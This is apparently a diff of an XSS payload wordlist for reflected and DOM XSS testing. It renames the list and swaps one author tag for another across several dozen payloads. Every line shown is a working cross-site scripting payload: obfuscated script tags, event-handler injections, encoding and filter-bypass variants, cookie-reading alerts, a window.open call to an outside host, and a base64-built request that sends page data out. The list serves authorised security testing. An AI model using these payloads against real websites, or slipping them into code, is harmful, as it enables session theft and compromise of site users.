@@ -1,4 +1,4 @@
-# Vaelion-XSS payload list
+# Reflectra-XSS payload list
 # XSS payloads for reflected/DOM XSS testing. One payload per line. Lines starting with # are ignored.
 ‘>alert(154)</script><script/154=’;;;;;;;
 <ScriPt>ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()</sCripT>
@@ -167,7 +167,7 @@ IMG+LOWSRC="javascript:alert(1);">
 <img onerror=a&#x006c;ert(1) src=a>
 <img onerror=a&#x06c;ert(1) src=a>
 <img onerror=a&#x6c;ert(1) src=a>
-{"<img onerror=confirm('xss_by_vaelion')src/>":1}
+{"<img onerror=confirm('xss_by_pratik')src/>":1}
 <img onerror=eval('al&#x5c;u0065rt(1)') src=a>
 <img onerror=eval(‘al&#x5c;u0065rt(1)’)src=a>
 ><img/onerror="javascript:alert(1%26%23x000000029;" src=x>
@@ -273,9 +273,9 @@ IMG+LOWSRC="javascript:alert(1);">
 <img/src/onerror=alert(1)
 <img/src/onerror=alert/*1337*/(1)>
 #"><img src=/ onerror=alert(2)>
-"><img/src/onerror=alert(`vaelion`)>
-#<img/src/onerror=alert(`vaelion`)>
-<img/src/onerror=alert(`vaelion`)>
+"><img/src/onerror=alert(`pratik`)>
+#<img/src/onerror=alert(`pratik`)>
+<img/src/onerror=alert(`pratik`)>
 <img src="" onerror="alert(document.cookie)">
 ??"><img/src/onerror=alert(document.domain)>
 <img/src/onerror=alert//&NewLine;(2)>
@@ -708,7 +708,7 @@ javascript://</title></textarea></style></script --><li '//" '*/alert()/*', oncl
 %3E'><script>alert(2);</script>
 %3F%20<body onload=alert("bingo")>
 %3F%20<img src=1 onerror=alert(1)>
-%3F%20<img/src/onerror=alert(vaelion`)>
+%3F%20<img/src/onerror=alert(pratik`)>
 %3F%20"><img src=q onerror=alert(1)>
 %3F%20"><img src=x onerror=prompt(document.domain);>
 %3F%20javascript:alert(1)
@@ -760,7 +760,7 @@ $ <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=? ------
 >%0D%0A%0D%0A<x '=foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
 %0d%0a%20<body onload=alert("bingo")>
 %0d%0a%20<img src=1 onerror=alert(1)>
-%0d%0a%20<img/src/onerror=alert(vaelion`)>
+%0d%0a%20<img/src/onerror=alert(pratik`)>
 %0d%0a%20"><img src=q onerror=alert(1)>
 %0d%0a%20"><img src=x onerror=prompt(document.domain);>
 %0d%0a%20javascript:alert(1)
@@ -808,7 +808,7 @@ _0x68087f:alert(0x1);
 %20<body onload=alert("bingo")>
 /";%20confirm(1);%20//
 %20<img src=1 onerror=alert(1)>
-%20<img/src/onerror=alert(vaelion`)>
+%20<img/src/onerror=alert(pratik`)>
 %20"><img src=q onerror=alert(1)>
 %20"><img src=x onerror=prompt(document.domain);>
 %20javascript:alert(1)
@@ -1096,28 +1096,28 @@ amF2YXNjcmlwdDphbGVydCgiWHNzIGJ5IHZpa2FzIik=
 ”&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;svg onload=alert&amp;amp;amp;amp;amp;#0000000040"1")&amp;amp;amp;amp;gt;
 "&amp;amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;amp;gt;
 &amp;amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;amp;gt;
-&amp;amp;amp;amp;lt;img/src/onerror=alert(`vaelion`)&amp;amp;amp;amp;gt;
+&amp;amp;amp;amp;lt;img/src/onerror=alert(`pratik`)&amp;amp;amp;amp;gt;
 &amp;amp;amp;amp;lt;script&amp;amp;amp;amp;gt;alert(1)&amp;amp;amp;amp;lt;/script&amp;amp;amp;amp;gt;
 "&amp;amp;amp;gt;&amp;amp;amp;lt;img src=x onerror=prompt(document.domain);&amp;amp;amp;gt;
 "&amp;amp;amp;gt;&amp;amp;amp;lt;svg onload=alert(1)&amp;amp;amp;gt;
 ”&amp;amp;amp;gt;&amp;amp;amp;lt;svg onload=alert&amp;amp;amp;amp;#0000000040"1")&amp;amp;amp;gt;
 "&amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;gt;
 &amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;gt;
-&amp;amp;amp;lt;img/src/onerror=alert(`vaelion`)&amp;amp;amp;gt;
+&amp;amp;amp;lt;img/src/onerror=alert(`pratik`)&amp;amp;amp;gt;
 &amp;amp;amp;lt;script&amp;amp;amp;gt;alert(1)&amp;amp;amp;lt;/script&amp;amp;amp;gt;
 "&amp;amp;gt;&amp;amp;lt;img src=x onerror=prompt(document.domain);&amp;amp;gt;
 "&amp;amp;gt;&amp;amp;lt;svg onload=alert(1)&amp;amp;gt;
 ”&amp;amp;gt;&amp;amp;lt;svg onload=alert&amp;amp;amp;#0000000040"1")&amp;amp;gt;
 "&amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;gt;
 &amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;gt;
-&amp;amp;lt;img/src/onerror=alert(`vaelion`)&amp;amp;gt;
+&amp;amp;lt;img/src/onerror=alert(`pratik`)&amp;amp;gt;
 &amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt;
 "&amp;gt;&amp;lt;img src=x onerror=prompt(document.domain);&amp;gt;
 "&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;
 ”&amp;gt;&amp;lt;svg onload=alert&amp;amp;#0000000040"1")&amp;gt;
 "&amp;lt;img src=1 onerror=alert(1)&amp;gt;
 &amp;lt;img src=1 onerror=alert(1)&amp;gt;
-&amp;lt;img/src/onerror=alert(`vaelion`)&amp;gt;
+&amp;lt;img/src/onerror=alert(`pratik`)&amp;gt;
 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
 "><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
 anything&callback=%22;alert%60XSS_POC_BY_SAAJAN_BHUJEL%60;%2f%2f
@@ -1277,7 +1277,7 @@ breakout"/href="javas%26%23x63 ;ript:selffalx\ert%'.replace(/x/,"]()"
 \"));}catch(e){x=window.open('http://xss.cx/');setTimeout('confirm(x.document.body.innerText)',4000)}//
 {{_c.constructor('alert(1)')()}}
 '`"><*chr*script>log(*num*)</script>
-vaelion"*alert(1)*"
+pratik"*alert(1)*"
 <command onclick="alert('XSS')">Command</command>
 //comment%0a%0dalert(0);
 <comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
@@ -1428,7 +1428,7 @@ document.write(atob('PGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MDkvcD89') + btoa(docum
 %E2%80%9C%3E%3CSvG%2Fonload%3Dalert%28document.domain%29%3E
 %E5%98%8D%E5%98%8A%20<body onload=alert("bingo")>
 %E5%98%8D%E5%98%8A%20<img src=1 onerror=alert(1)>
-%E5%98%8D%E5%98%8A%20<img/src/onerror=alert(vaelion`)>
+%E5%98%8D%E5%98%8A%20<img/src/onerror=alert(pratik`)>
 %E5%98%8D%E5%98%8A%20"><img src=q onerror=alert(1)>
 %E5%98%8D%E5%98%8A%20"><img src=x onerror=prompt(document.domain);>
 %E5%98%8D%E5%98%8A%20javascript:alert(1)
@@ -1695,7 +1695,7 @@ location=/javascript:alert%2823%29/.source;
 location='javaScriPt:alert\x2845\x29'
 location='JaVaScRiPt:prompt'+document.location.hash[1]+'45'+document.location.hash[2]
 ";location=location.hash)//#0={};alert(0)
-Login.aspx?username=<img/src/onerror=alert(vaelion)>
+Login.aspx?username=<img/src/onerror=alert(pratik)>
 <lol/onauxclick=[0].some(alert)>rightclickhere
 '>&lt;/b&gt;%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cb&gt;&lt;!--
 '>&lt;/b&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;b&gt;&lt;!--
@@ -1703,7 +1703,7 @@ Login.aspx?username=<img/src/onerror=alert(vaelion)>
 &lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt%2Ca(origin)%20x&gt;
 &lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x&gt;
 &lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
-#&lt;img&#47;src&#47;onerror=alert(`vaelion`)&gt;
+#&lt;img&#47;src&#47;onerror=alert(`pratik`)&gt;
 &lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
 "&lt;img src=1 onerror=alert(1)&gt;
 &lt;img src=1 onerror=alert(1)&gt;
@@ -1714,7 +1714,7 @@ Login.aspx?username=<img/src/onerror=alert(vaelion)>
 &lt;IMG SRC=javascript&#058;alert('XSS')&gt;
 &lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
 &lt;img src=# onerror=alert(1)&gt;
-&lt;img/src/onerror=alert(`vaelion`)&gt;
+&lt;img/src/onerror=alert(`pratik`)&gt;
 &lt;img/src=&quot;x&quot;/onerror=alert(23)&gt;
 &lt;img src=x onerror=alert()>
 &lt;img src=x onerror=alert(1)&gt;.crt
@@ -1902,7 +1902,7 @@ PHN2ZyBvbmxvYWQ9YWxlcnQmYWxlcnQoMjMgKT4=
 PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 PHNjcmlwdD5pbWcgc3JjPXggb25lcnJvci5wcm9tb3RlKHRy
 <?php echo('<SCR'); echo('IPT>alert("XSS")</SCRIPT>'); ?>
-<p><img/src/onerror=alert(`vaelion`)></p>
+<p><img/src/onerror=alert(`pratik`)></p>
 <plaintext onfocus=alert(1) autofocus tabindex=1>	
 \><plaintext/onmouseover=prompt(1)
 </plaintext\></|\><plaintext/onmouseover=prompt(1)
@@ -1950,7 +1950,7 @@ prototype.join=function(){confirm("PWND:"+document.body.innerHTML)}')();
 <p v-show="_c.constructor`alert(1)`()">
 q="><img/src/onerror=.1|alert`` class=d>
 q=javascript:alert(document.domain)
-?query=<img/src/onerror=alert(`vaelion`)>
+?query=<img/src/onerror=alert(`pratik`)>
 ?query="><img src=x onerror=prompt(document.domain);>
 #&quot;-alert(1)}//
 &quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
@@ -2128,9 +2128,9 @@ ryp3i"accesskey="x"onclick="alert(1)"//opk15
 <scr\uffffipt>alert(0)</script>
 <scr\x00ipt>alert(1)</scr\x00ipt>
 <sc<script>ript>alert(123)</sc</script>ript>
-search?q=<img/src/onerror=alert(`vaelion`)>
+search?q=<img/src/onerror=alert(`pratik`)>
 search?q=javascript:alert(document.domain)
-Search/Results?q=<img/src/onerror=alert(`vaelion`)>
+Search/Results?q=<img/src/onerror=alert(`pratik`)>
 Search/Results?q="><img src=x onerror=prompt(document.domain);>
 secbreake@gmail.com\u003C/script\u003E\u003Cscript\u003Ealert(document.domain)//
 <select autofocus onfocus=alert(1)>
@@ -2308,7 +2308,7 @@ svg/onload=alert(document.cookie)abcdef@test.com
 #"'><svg/onload=confirm(666)>
 "><svg onload="confirm(7)">
 <svg onload="confirm(7)">
-"<!--><Svg OnLoad=confirm?.(/vaelion/)<!--1")"<!--><Svg+OnLoad=confirm?.(/vaelion/)<!--
+"<!--><Svg OnLoad=confirm?.(/pratik/)<!--1")"<!--><Svg+OnLoad=confirm?.(/pratik/)<!--
 <svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
 <svg/onload=eval(atob(‘YWxlcnQoZG9jdW1lbnQuY29va2llKQ==’))>
 <svg onload=eval(document.cookie)>
